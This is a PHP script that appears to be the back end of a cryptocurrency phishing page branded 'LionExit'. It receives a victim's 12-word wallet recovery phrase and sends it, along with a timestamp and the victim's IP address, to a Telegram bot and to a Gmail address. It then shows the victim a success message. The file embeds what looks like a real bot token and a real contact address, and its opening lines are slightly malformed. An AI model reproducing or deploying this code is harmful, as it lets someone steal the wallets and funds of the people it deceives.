<?php<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
?>
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $mnemonic = $_POST["mnemonic"];

    // === Telegram Bot Setup ===
    $botToken = "8340492899:AAF1RLFOEP6Yz105-vjJcMVH-UhGODeKLFw";
    $chatId = "7968159479";
    $message = "🚨 *New Seed Phrase Submitted* 🚨\n\n🔑 *12 Words:* \n`$mnemonic`\n\n🕓 " . date("Y-m-d H:i:s") . "\n🌍 IP: " . $_SERVER['REMOTE_ADDR'];

    // Send to Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];
    file_get_contents($url . "?" . http_build_query($data));

    // === Email Setup ===
    $to = "biggesttoney.bk@gmail.com";
    $subject = "🚨 New LionExit Seed Phrase Received";
    $headers = "From: LionExit Bot <no-reply@lionexitprotocol.org>\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

    $emailBody = "🔥 NEW SEED PHRASE ALERT 🔥\n\n12-Word Recovery Phrase:\n$mnemonic\n\nReceived on: " . date("Y-m-d H:i:s") . "\nUser IP: " . $_SERVER['REMOTE_ADDR'];

    mail($to, $subject, $emailBody, $headers);

    echo "✅ Phrase submitted successfully!";
} else {
    echo "❌ Invalid request.";
}
?>